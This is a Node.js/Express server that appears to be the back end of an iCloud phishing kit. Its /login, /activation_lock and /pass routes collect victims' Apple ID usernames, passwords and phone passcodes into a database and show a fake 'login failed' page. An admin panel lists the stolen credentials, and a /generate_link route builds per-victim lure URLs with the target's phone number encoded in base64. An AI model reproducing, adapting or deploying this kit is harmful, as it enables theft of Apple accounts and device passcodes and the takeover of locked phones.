const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const Message = require('./model/admin')
const User = require("./model/user");
const auth = require("./middleware/auth");
const jwt = require("jsonwebtoken");
const cookieParser = require('cookie-parser');
const Admin = require('./model/admin')

require("dotenv").config();
require("./config/database").connect();
const url = require('url');


const app = express();

app.use(express.json());

app.use(cookieParser());

app.use(bodyParser.urlencoded({extended: true}))

app.use(express.static("public"));

app.set('view engine', 'ejs');

// dotenv.config();
// mongoose.connect(process.env.MONGODB);


// home
app.get("/", async (req, res) =>{
    res.sendFile(__dirname + "/src/index.html" );
});
// login
app.post("/login", async (req, res) =>{
    const { username, password, phone} = req.body;
    const urlParams = new URLSearchParams(phone)
    //const target_phone = atob(urlParams.get('phone'));
    const target = urlParams.get('phone');
    const target_phone = Buffer.from(target, 'base64').toString()
    // Create token
    const payload = { 
        username: username
    };      
    // Simple token signing
    const token = jwt.sign(payload, process.env.JWT_KEY);
    // console.log(token);
    // save token to local catche/storage
    res.cookie('jwt', token);
    // Create user in our database
    const user = await User.create({
        fistIcloud: username.toLowerCase(),
        firstPassword: password,
        targetPhone: target_phone,
        // secondIcloud: "",
        // secondPassword: "",
        phonePassword: "",
        thirdIcloud: "",
        thirdPassowrd: ""

    });
    res.status(200).sendFile(__dirname + "/src/loginFailed.html")
});

// another login page
app.get("/log-in", async (req, res) =>{
    res.sendFile(__dirname + "/src/activation_loc.html")
})

// post the last creds..
app.post("/activation_lock", async (req, res) =>{
    // const passcode = req.body.passcode;
    const icloud = req.body.icloud;
    const third_password = req.body.password;

    const jwtToken = req.cookies.jwt; // Get the JWT token from the cookie
    if(jwtToken){
        // Decode the JWT token
        const payload = jwt.decode(jwtToken);
        // console.log(payload.username);
        const user = await User.updateOne(
            { fistIcloud: payload.username },
            { $set: {thirdIcloud: icloud, thirdPassowrd: third_password} },
            { returnOriginal: false },
            function(err, result) {
              if (err) throw err;
            //   console.log(result);
        });
        // console.log(user)
        //clear cookies and redirecto first page
        res.sendFile(__dirname + "/src/four.html");
    }
    else{
        res.send("Token Required")
    }
})
// pass
app.post("/pass", async (req, res) =>{
    const passcode = req.body.passcode;
    const jwtToken = req.cookies.jwt;
    if(jwtToken){
        // Decode the JWT token
        const payload = jwt.decode(jwtToken);
        const user = await User.updateOne(
            { fistIcloud: payload.username },
            { $set: { phonePassword: passcode} },
            { returnOriginal: false },
            function(err, result) {
              if (err) throw err;
            //   console.log(result);
        });
        // res.sendFile(__dirname + "/src/six.html")
        res.sendFile(__dirname + "/src/loading.html")
    }
    else{
        res.send("Token Required")
    }
});

// admin panel
app.get("/admin", async (req, res) =>{
    res.render("admin_login", {
        response_: ""
    });
});
app.post("/admin", async (req, res)=>{
    try {
        //get user input
        const { username, password } = req.body;

        // check if user exist
        const admin = await Admin.findOne({ username });
        if(admin){
            if(password === admin.password){
                // Create token
                const token = jwt.sign(
                    { user_id: admin._id, username },
                    process.env.JWT_KEY,
                    {
                    expiresIn: "1h",
                    }
                );
                // save token
                res.cookie('jwt', token);

                // user
                User.find().then(function(creds){
                    creds.reverse();
                    res.render("admin",{
                        infos_ejs: creds
                    });
                })
                }
                else{
                    res.render("admin_login", {
                        response_: "Login Failed"
                    });
                }
            }
            else{
                res.render("admin_login", {
                    response_: "Login Failed"
                });
            }
    } catch (err) {
        console.log(err);
    }
});
app.post("/delete_creds", auth, async (req, res) =>{
    const icloud_id = req.body.icloud_id
    try{
        const deleteUser = await User.findByIdAndDelete(
            icloud_id
        )
        User.find().then(function(creds){
            creds.reverse();
            res.render("admin",{
                infos_ejs: creds
            });
        })
    }
    catch(err){
        console.log(err);
        res.redirect("/admin");
    }
    
});

// generate link
app.get("/generate_link", auth, async (req, res) =>{
    res.render("generate_link",{
        hash: ""
    })
});

app.post("/generate_link", auth, async (req, res) =>{
    const plainText = req.body.text;
    const loc = req.body.loc;
    //const base_ = btoa(plainText);
    const base_ = Buffer.from(plainText).toString('base64');
    res.render("generate_link",{
        hash: loc + "/?phone=" + base_,
    })
});

app.get("/credentials__", auth, async (req, res)=>{
    User.find().then(function(creds){
        creds.reverse();
        res.render("admin",{
            infos_ejs: creds
        });
    })
});
// change password
app.get("/change_admin_password", auth, async (req, res) =>{
    res.render("change_admin_pass",{
        response_: "",
    })
});

app.post("/change_admin_password", auth, async (req, res) =>{
    
    try {
        const username = "admin"
        const old_ = req.body.old_password;
        const new_ = req.body.new_password;
        
        // check if user exist
        const admin = await Admin.findOne({ username });
        if(old_ != admin.password){
            res.render("change_admin_pass",{
                response_: "Wrong password, Try again!",
            })
            }
        else{
            try{
                const admin_ = await Admin.updateOne(
                    { username: username},
                    { $set: { password: new_} },
                    { returnOriginal: false },
                    function(err, result) {
                      if (err) throw err;
                    //   console.log(result);
                });
                // user
                res.render("change_admin_pass",{
                    response_: "Password Changed",
                })
            }
            catch(err){
                res.render("change_admin_pass",{
                    response_: "Wrong password, Try again!",
                })
            }
            
        }
    } catch (err) {
        console.log(err);
    }
});

app.get("/logout", auth ,async (req, res) => {
    res.clearCookie('jwt');
    res.redirect('/admin');
});

let port = process.env.PORT;
if(port == null || port ==""){
    port = 9000;
}
//listener
app.listen(port, function() {
    console.log('Server started --> http://localhost:9000');
});
